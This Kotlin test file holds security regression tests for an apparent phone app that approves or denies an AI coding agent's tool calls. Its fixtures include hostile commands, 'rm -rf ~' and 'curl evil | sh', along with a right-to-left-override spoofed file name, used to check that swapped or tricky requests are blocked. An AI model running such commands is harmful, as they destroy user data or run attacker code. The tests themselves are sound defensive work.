package dev.agentnest.core

import dev.agentnest.core.approval.BuildResult
import dev.agentnest.core.approval.DecisionBlock
import dev.agentnest.core.approval.DecisionBuilder
import dev.agentnest.core.approval.DecisionContext
import dev.agentnest.core.approval.DecisionValidator
import dev.agentnest.core.approval.Enablement
import dev.agentnest.core.approval.UserGateResult
import dev.agentnest.core.crypto.B64
import dev.agentnest.core.link.BackoffPolicy
import dev.agentnest.core.link.DeviceCredentials
import dev.agentnest.core.link.DeviceDescriptor
import dev.agentnest.core.link.HostBookState
import dev.agentnest.core.link.LinkClient
import dev.agentnest.core.link.LinkSideEffects
import dev.agentnest.core.link.LinkState
import dev.agentnest.core.link.PairingEffect
import dev.agentnest.core.link.PairingFailure
import dev.agentnest.core.link.PairingFlow
import dev.agentnest.core.link.SecurityAlertKind
import dev.agentnest.core.link.WsCallbacks
import dev.agentnest.core.link.WsConnection
import dev.agentnest.core.link.WsTransport
import dev.agentnest.core.nest.ApprovalCard
import dev.agentnest.core.nest.NestReducer
import dev.agentnest.core.protocol.AgentState
import dev.agentnest.core.protocol.ApprovalRequestMessage
import dev.agentnest.core.protocol.AuthMethod
import dev.agentnest.core.protocol.ChallengeMessage
import dev.agentnest.core.protocol.ChallengePayload
import dev.agentnest.core.protocol.Codec
import dev.agentnest.core.protocol.DecodeResult
import dev.agentnest.core.protocol.Decision
import dev.agentnest.core.protocol.DecisionMessage
import dev.agentnest.core.protocol.DecisionPayload
import dev.agentnest.core.protocol.ErrorMessage
import dev.agentnest.core.protocol.ErrorPayload
import dev.agentnest.core.protocol.ExtraConfirmationLevel
import dev.agentnest.core.protocol.PairResultMessage
import dev.agentnest.core.protocol.PairResultPayload
import dev.agentnest.core.protocol.Policy
import dev.agentnest.core.protocol.QrParseResult
import dev.agentnest.core.protocol.QrPayload
import dev.agentnest.core.protocol.Resync
import dev.agentnest.core.protocol.ResyncMode
import dev.agentnest.core.protocol.RiskLevel
import dev.agentnest.core.protocol.SnapshotMessage
import dev.agentnest.core.protocol.SnapshotRequestMessage
import dev.agentnest.core.protocol.Ts
import kotlinx.coroutines.CoroutineStart
import kotlinx.coroutines.ExperimentalCoroutinesApi
import kotlinx.coroutines.launch
import kotlinx.coroutines.test.TestScope
import kotlinx.coroutines.test.runCurrent
import kotlinx.coroutines.test.runTest
import java.time.Instant
import kotlin.test.Test
import kotlin.test.assertEquals
import kotlin.test.assertFailsWith
import kotlin.test.assertFalse
import kotlin.test.assertIs
import kotlin.test.assertNotNull
import kotlin.test.assertNull
import kotlin.test.assertTrue

/**
 * Regression tests for the independent security review (experiments E1-E7 asserted the buggy behaviour; here the
 * FIXED behaviour is asserted).
 */
@OptIn(ExperimentalCoroutinesApi::class)
class ReviewRegressionTest {
    private val now = T.T0.plusSeconds(10)
    private val envId = "01929f1a-6c2e-7b3c-9e4d-2a7b1c3d4e5f"

    // ---- E1: lenient scalars ------------------------------------------------------------------------
    @Test
    fun `E1 codec rejects v and seq given as JSON strings`() {
        val pong = """{"v":"1","type":"pong","id":"$envId","ts":"2026-10-15T09:12:33.120Z","payload":{"in_reply_to":"x","server_time":"2026-10-15T09:12:33.120Z"}}"""
        assertIs<DecodeResult.Invalid>(Codec.decode(pong))
        val ev = """{"v":1,"type":"adapter_status","id":"$envId","ts":"2026-10-15T09:12:33.120Z","seq":"7","payload":{"agent_kind":"codex","status":"connected","mode":"hooks_cli"}}"""
        assertIs<DecodeResult.Invalid>(Codec.decode(ev))
        val ok = ev.replace("\"seq\":\"7\"", "\"seq\":7")
        assertIs<DecodeResult.Decoded>(Codec.decode(ok))
    }

    // ---- E2: approval_request binding validation -----------------------------------------------------
    private fun approvalJson(
        requestId: String = "ar_01929f1a-6c2e-7b3c-9e4d-2a7b1c3d4e5f",
        nonce: String = "nj8VYyTULw6ktvT86B1W+w==",
        hash: String = "940519b4cf559666e1068256e714a63ef4b8df29e78fc02b9b75079bbeae4032",
        risk: String = """{"level":"low","extra_confirmation":"none"}""",
    ) = """{"v":1,"type":"approval_request","id":"$envId","ts":"2026-10-15T12:00:00.000Z","seq":5,"payload":{
          "request_id":"$requestId","nonce_b64":"$nonce","session_key":"claude_code:s1",
          "created_at":"2026-10-15T12:00:00.000Z","expires_at":"2026-10-15T12:02:00.000Z","tool_input_sha256":"$hash",
          "risk":$risk,"allowed_decisions":["allow"]}}"""

    @Test
    fun `E2 approval_request with garbage binding fields is dropped by the codec`() {
        assertIs<DecodeResult.Decoded>(Codec.decode(approvalJson()))
        assertIs<DecodeResult.Invalid>(Codec.decode(approvalJson(requestId = "EVIL id with spaces/../")))
        assertIs<DecodeResult.Invalid>(Codec.decode(approvalJson(nonce = "!!notbase64")))
        assertIs<DecodeResult.Invalid>(Codec.decode(approvalJson(nonce = B64.encode(ByteArray(15)))))
        assertIs<DecodeResult.Invalid>(Codec.decode(approvalJson(hash = "NOT-HEX")))
        assertIs<DecodeResult.Invalid>(Codec.decode(approvalJson(hash = "A".repeat(64))))
    }

    @Test
    fun `E2 extra_confirmation null is strict not none`() {
        val d = Codec.decode(approvalJson(risk = """{"level":"low","extra_confirmation":null}"""))
        val msg = assertIs<DecodeResult.Decoded>(d).message as ApprovalRequestMessage
        assertEquals(ExtraConfirmationLevel.UNKNOWN, msg.payload.risk.extraConfirmation)
        val gate = DecisionValidator.gate(msg.payload, Decision.ALLOW, Policy())
        assertEquals(ExtraConfirmationLevel.HOLD_AND_RECONFIRM, gate.extraConfirmation)
        // a missing field is still the documented default
        val missing = Codec.decode(approvalJson(risk = """{"level":"low"}"""))
        assertEquals(ExtraConfirmationLevel.NONE, ((missing as DecodeResult.Decoded).message as ApprovalRequestMessage).payload.risk.extraConfirmation)
    }

    @Test
    fun `E2 a snapshot drops cards with malformed binding fields`() {
        val good = T.request(id = "ar_01929f1a-6c2e-7b3c-9e4d-00000000001a")
        val bad = good.copy(requestId = "ar_bad", nonceB64 = "!!")
        val snap = T.snapshot(10, listOf(T.session("claude_code:s1", AgentState.AWAITING_APPROVAL)), listOf(good, bad), ids = listOf(good.requestId, bad.requestId))
        val decoded = assertIs<DecodeResult.Decoded>(Codec.decode(Codec.encodeAny(snap))).message as SnapshotMessage
        assertEquals(listOf(good.requestId), decoded.payload.pendingApprovals.map { it.requestId })
        assertEquals(listOf(good.requestId), decoded.payload.pendingApprovalIdsComplete)
    }

    @Test
    fun `E2 the phone refuses to build or encode a decision for a malformed card`() {
        val bad = T.request(id = "EVIL id", level = RiskLevel.LOW, extra = ExtraConfirmationLevel.NONE).copy(nonceB64 = "!!notbase64", toolInputSha256 = "NOT-HEX")
        val card = ApprovalCard(bad.requestId, bad, T.T0)
        val ctx = DecisionContext(now, 0, T.connected(), null, Policy(), awaitingSnapshot = false)
        assertEquals(DecisionBlock.MALFORMED_REQUEST, assertIs<Enablement.Disabled>(DecisionValidator.enablement(card, Decision.ALLOW, ctx)).reason)
        assertEquals(
            BuildResult.Refused(DecisionBlock.MALFORMED_REQUEST),
            DecisionBuilder().build(card, Decision.ALLOW, UserGateResult(AuthMethod.BIOMETRIC, now.minusSeconds(1)), ctx),
        )
        val raw = DecisionMessage(
            T.meta(),
            DecisionPayload(bad.requestId, bad.sessionKey, bad.nonceB64, bad.toolInputSha256, Decision.DENY, null, Ts.of(now)),
        )
        assertFailsWith<IllegalArgumentException> { Codec.encode(raw) }
    }

    // ---- E3: stale card between welcome and snapshot --------------------------------------------------
    @Test
    fun `E3 card from the previous connection is not actionable between welcome and snapshot`() {
        val reducer = NestReducer(ids = { T.id() })
        var s = reducer.initial(T.T0)
        s = reducer.onLink(s, T.connected(), T.T0)
        s = reducer.reduce(s, T.welcome(at = T.T0, resync = Resync(ResyncMode.NONE)), T.T0).state
        val req = T.request(id = "ar_01929f1a-6c2e-7b3c-9e4d-00000000001a", created = T.T0)
        s = reducer.reduce(s, T.snapshot(10, listOf(T.session("claude_code:s1", AgentState.AWAITING_APPROVAL, pending = listOf(req.requestId))), listOf(req), at = T.T0), T.T0).state
        s = reducer.onLink(s, LinkState.Offline, T.T0.plusSeconds(20))
        val later = T.T0.plusSeconds(40)
        s = reducer.onLink(s, T.connected(later), later)
        s = reducer.reduce(s, T.welcome(at = later, resync = Resync(ResyncMode.SNAPSHOT)), later).state
        assertTrue(s.resync.awaitingSnapshot)
        val card = s.approvals.getValue(req.requestId)
        val ctx = DecisionContext.from(s, req, later)
        for (d in listOf(Decision.ALLOW, Decision.DENY, Decision.DENY_AND_STOP)) {
            assertEquals(DecisionBlock.RESYNCING, assertIs<Enablement.Disabled>(DecisionValidator.enablement(card, d, ctx)).reason, d.name)
        }
        // the snapshot arrives and still lists the request: actionable again
        val snap = T.snapshot(11, listOf(T.session("claude_code:s1", AgentState.AWAITING_APPROVAL, pending = listOf(req.requestId))), listOf(req), at = later)
        s = reducer.reduce(s, snap, later).state
        assertFalse(s.resync.awaitingSnapshot)
        assertIs<Enablement.Enabled>(DecisionValidator.enablement(s.approvals.getValue(req.requestId), Decision.ALLOW, DecisionContext.from(s, req, later)))
    }

    // ---- E4: pair_result before the SAS -----------------------------------------------------------------
    @Test
    fun `E4 pair_result ok right after the challenge is refused and unpairs`() {
        val secretB64 = B64.encodeUrl(ByteArray(32) { (it + 1).toByte() })
        val pin = dev.agentnest.core.crypto.SpkiPin.ofSpki(ByteArray(91) { it.toByte() })
        val json = """{"v":1,"pc_id":"${pin.derivedPcId()}","pc_name":"PC","hosts":["192.168.0.10"],"port":47832,""" +
            """"spki_pin":"${pin.toPinString()}","pairing_id":"p_1","pairing_secret":"$secretB64","expires_at":"2026-10-15T09:02:00Z"}"""
        val qr = assertIs<QrParseResult.Success>(QrPayload.parse(QrPayload.URI_PREFIX + B64.encodeUrl(json.toByteArray()), Instant.parse("2026-10-15T09:00:00Z"))).payload
        val flow = PairingFlow(qr, DeviceDescriptor("Galaxy"), ByteArray(91) { 1 }, ids = { T.id() })
        val t = Instant.parse("2026-10-15T09:00:01Z")
        flow.onMessage(ChallengeMessage(T.meta(at = t), ChallengePayload(B64.encode(ByteArray(16) { 9 }), pin.derivedPcId(), Ts.of(t), 5000)), t)
        val effects = flow.onMessage(
            PairResultMessage(T.meta(at = t), PairResultPayload(true, "dev_1", "Zr9".padEnd(43, 'A'), T.PC.copy(pcId = pin.derivedPcId()))), t,
        )
        assertTrue(effects.none { it is PairingEffect.Completed })
        assertTrue(effects.any { it is PairingEffect.Failed && it.failure == PairingFailure.PROTOCOL })
        assertTrue(effects.any { it is PairingEffect.Send })
    }

    // ---- reducer: error frames and binding conflicts ---------------------------------------------------------
    private fun connectedReducer(): Pair<NestReducer, dev.agentnest.core.nest.NestState> {
        val reducer = NestReducer(ids = { T.id() })
        var s = reducer.initial(T.T0)
        s = reducer.onLink(s, T.connected(), T.T0)
        s = reducer.reduce(s, T.welcome(at = T.T0, resync = Resync(ResyncMode.NONE)), T.T0).state
        return reducer to s
    }

    @Test
    fun `E5 an error reply to the in-flight decision clears the in-flight state`() {
        val (reducer, start) = connectedReducer()
        val req = T.request(id = "ar_01929f1a-6c2e-7b3c-9e4d-00000000001b", created = T.T0)
        var s = reducer.reduce(start, T.approvalMsg(1, req), T.T0).state
        s = reducer.markDecisionSent(s, req.requestId, "mid", Decision.DENY, T.T0)
        // an unrelated error does not touch the card
        s = reducer.reduce(s, ErrorMessage(T.meta(), ErrorPayload("E_INTERNAL", "x", null, "other", false)), T.T0).state
        assertNotNull(s.approvals.getValue(req.requestId).inFlight)
        s = reducer.reduce(s, ErrorMessage(T.meta(), ErrorPayload("E_RATE_LIMITED", "too many", "너무 많아요", "mid", false)), T.T0).state
        val card = s.approvals.getValue(req.requestId)
        assertNull(card.inFlight)
        assertEquals(false, card.lastResult?.accepted)
        assertEquals("너무 많아요", card.lastResult?.messageKo)
        assertEquals("E_RATE_LIMITED", s.lastError?.code)
    }

    @Test
    fun `a second approval_request with the same id but another hash locks the card and asks for a snapshot`() {
        val (reducer, start) = connectedReducer()
        val req = T.request(id = "ar_01929f1a-6c2e-7b3c-9e4d-00000000001c", created = T.T0, level = RiskLevel.LOW, extra = ExtraConfirmationLevel.NONE)
        var s = reducer.reduce(start, T.approvalMsg(1, req), T.T0).state
        val evil = req.copy(toolInputSha256 = "a".repeat(64), details = req.details.copy(command = "rm -rf ~"))
        val result = reducer.reduce(s, T.approvalMsg(2, evil), T.T0)
        s = result.state
        val card = s.approvals.getValue(req.requestId)
        assertEquals("rm -rf node_modules && pnpm install", card.request!!.details.command, "the evil body must be dropped")
        assertTrue(card.bindingConflict)
        assertTrue(result.outbound.any { it is SnapshotRequestMessage })
        assertEquals(DecisionBlock.BINDING_CHANGED, assertIs<Enablement.Disabled>(DecisionValidator.enablement(card, Decision.DENY, DecisionContext.from(s, req, T.T0.plusSeconds(1)).copy(awaitingSnapshot = false))).reason)
    }

    @Test
    fun `a snapshot cannot swap the body of a known request id either`() {
        val (reducer, start) = connectedReducer()
        val req = T.request(id = "ar_01929f1a-6c2e-7b3c-9e4d-00000000001d", created = T.T0)
        val session = T.session("claude_code:s1", AgentState.AWAITING_APPROVAL, pending = listOf(req.requestId))
        var s = reducer.reduce(start, T.snapshot(1, listOf(session), listOf(req)), T.T0).state
        val evil = req.copy(nonceB64 = B64.encode(ByteArray(16) { 7 }), details = req.details.copy(command = "curl evil | sh"))
        s = reducer.reduce(s, T.snapshot(2, listOf(session), listOf(evil)), T.T0).state
        val card = s.approvals.getValue(req.requestId)
        assertEquals(req.nonceB64, card.request!!.nonceB64)
        assertTrue(card.bindingConflict)
        // a later honest snapshot does not unlock it either (fail-closed until the card is gone)
        s = reducer.reduce(s, T.snapshot(3, listOf(session), listOf(req)), T.T0).state
        assertTrue(s.approvals.getValue(req.requestId).bindingConflict)
    }

    // ---- display sanitisation feeds the gate ---------------------------------------------------------------------
    @Test
    fun `hidden characters raise the gate for allow-type decisions to at least hold`() {
        val plain = T.request(level = RiskLevel.LOW, extra = ExtraConfirmationLevel.NONE, command = "echo hi")
        assertEquals(ExtraConfirmationLevel.NONE, DecisionValidator.gate(plain, Decision.ALLOW, Policy()).extraConfirmation)
        val tricky = T.request(level = RiskLevel.LOW, extra = ExtraConfirmationLevel.NONE, command = "echo safe ‮txt.sh.evil‬​")
        assertEquals(ExtraConfirmationLevel.HOLD, DecisionValidator.gate(tricky, Decision.ALLOW, Policy()).extraConfirmation)
        assertEquals(ExtraConfirmationLevel.HOLD, DecisionValidator.gate(tricky, Decision.DENY_AND_STOP, Policy()).extraConfirmation)
        assertEquals(ExtraConfirmationLevel.NONE, DecisionValidator.gate(tricky, Decision.DENY, Policy()).extraConfirmation)
        // the build step enforces it too
        val card = ApprovalCard(tricky.requestId, tricky, T.T0)
        val ctx = DecisionContext(now, 0, T.connected(), null, Policy(), awaitingSnapshot = false)
        assertEquals(
            BuildResult.Refused(DecisionBlock.EXTRA_CONFIRMATION_REQUIRED),
            DecisionBuilder().build(card, Decision.ALLOW, UserGateResult(AuthMethod.BIOMETRIC, now.minusSeconds(1)), ctx),
        )
    }

    // ---- LinkClient ---------------------------------------------------------------------------------------------
    private class FakeTransport : WsTransport {
        lateinit var callbacks: WsCallbacks
        val sent = ArrayList<String>()
        override fun open(host: String, port: Int, callbacks: WsCallbacks): WsConnection {
            this.callbacks = callbacks
            return object : WsConnection {
                override fun send(text: String): Boolean { sent += text; return true }
                override fun close(code: Int, reason: String) = Unit
                override fun cancel() = Unit
            }
        }
    }

    private object NoEffects : LinkSideEffects {
        override fun persistHosts(hosts: HostBookState) = Unit
        override fun wipeDeviceToken() = Unit
        override fun wipePairing() = Unit
        override fun securityAlert(kind: SecurityAlertKind) = Unit
    }

    private fun TestScope.connectedClient(transport: FakeTransport): LinkClient {
        val clock = object : java.time.Clock() {
            override fun getZone() = java.time.ZoneOffset.UTC
            override fun withZone(zone: java.time.ZoneId?) = this
            override fun instant(): Instant = T.T0.plusMillis(testScheduler.currentTime)
        }
        val client = LinkClient(
            transport, HostBookState(qr = listOf("192.168.0.10")), { DeviceCredentials("dev_1", B64.encodeUrl(ByteArray(32))) },
            NoEffects, backgroundScope, clock, backoff = BackoffPolicy(random = { 0.5 }), ids = { T.id() },
        )
        client.start(true)
        runCurrent()
        transport.callbacks.onOpen()
        transport.callbacks.onText(Codec.encodeAny(ChallengeMessage(T.meta(), ChallengePayload("cXk4Z1l0d2VyN3U4aW9wMQ==", T.PC.pcId, Ts.of(T.T0), 5000))))
        runCurrent()
        transport.callbacks.onText(Codec.encodeAny(T.welcome(at = T.T0, resync = Resync(ResyncMode.NONE))))
        runCurrent()
        return client
    }

    private fun ghostDecision(id: String, decision: Decision = Decision.DENY, user: UserGateResult = UserGateResult()): DecisionMessage {
        val ghost = T.request(id = id, created = T.T0)
        val card = ApprovalCard(ghost.requestId, ghost, T.T0)
        val ctx = DecisionContext(now, 0, T.connected(), null, Policy(), awaitingSnapshot = false)
        return (DecisionBuilder().build(card, decision, user, ctx) as BuildResult.Built).message
    }

    @Test
    fun `E6 LinkClient send refuses a decision and sends nothing`() = runTest {
        val transport = FakeTransport()
        val client = connectedClient(transport)
        val before = transport.sent.size
        val msg = ghostDecision(
            "ar_01929f1a-6c2e-7b3c-9e4d-0000000000ff", Decision.ALLOW,
            UserGateResult(AuthMethod.BIOMETRIC, now.minusSeconds(1), ExtraConfirmationLevel.HOLD),
        )
        var sent = true
        val job = launch { sent = client.send(msg) }
        runCurrent()
        job.join()
        assertFalse(sent)
        assertEquals(before, transport.sent.size)
        // the dedicated path refuses it as well because the card does not exist
        var viaSubmit = true
        launch { viaSubmit = client.submitDecision(msg) }
        runCurrent()
        assertFalse(viaSubmit)
        assertEquals(before, transport.sent.size)
    }

    @Test
    fun `E7 submitDecision queued before stop returns false instead of hanging`() = runTest {
        val transport = FakeTransport()
        val client = connectedClient(transport)
        val msg = ghostDecision("ar_01929f1a-6c2e-7b3c-9e4d-0000000000fe")
        var result: Boolean? = null
        val job = backgroundScope.launch(start = CoroutineStart.UNDISPATCHED) { result = client.submitDecision(msg) }
        client.stop()
        runCurrent()
        assertEquals(false, result)
        assertFalse(job.isActive)
    }

    @Test
    fun `E7 send and submitDecision after stop return false immediately`() = runTest {
        val transport = FakeTransport()
        val client = connectedClient(transport)
        client.stop()
        assertFalse(client.submitDecision(ghostDecision("ar_01929f1a-6c2e-7b3c-9e4d-0000000000fc")))
        assertFalse(client.send(DecisionBuilder().seen("ar_01929f1a-6c2e-7b3c-9e4d-0000000000fc", now)))
    }

    @Test
    fun `E7 control without stop the same call returns`() = runTest {
        val transport = FakeTransport()
        val client = connectedClient(transport)
        val msg = ghostDecision("ar_01929f1a-6c2e-7b3c-9e4d-0000000000fd")
        var finished = false
        backgroundScope.launch(start = CoroutineStart.UNDISPATCHED) { client.submitDecision(msg); finished = true }
        runCurrent()
        assertTrue(finished)
    }

    @Test
    fun `a codec failure while sending still answers false`() = runTest {
        val transport = FakeTransport()
        val client = connectedClient(transport)
        // a decision that makes the codec throw inside the processing coroutine still answers false
        val bad = DecisionMessage(
            T.meta(),
            DecisionPayload("ar_01929f1a-6c2e-7b3c-9e4d-0000000000fb", "claude_code:s1", "!!", "x", Decision.DENY, null, Ts.of(now)),
        )
        var result: Boolean? = null
        backgroundScope.launch { result = client.submitDecision(bad) }
        runCurrent()
        assertEquals(false, result)
    }
}
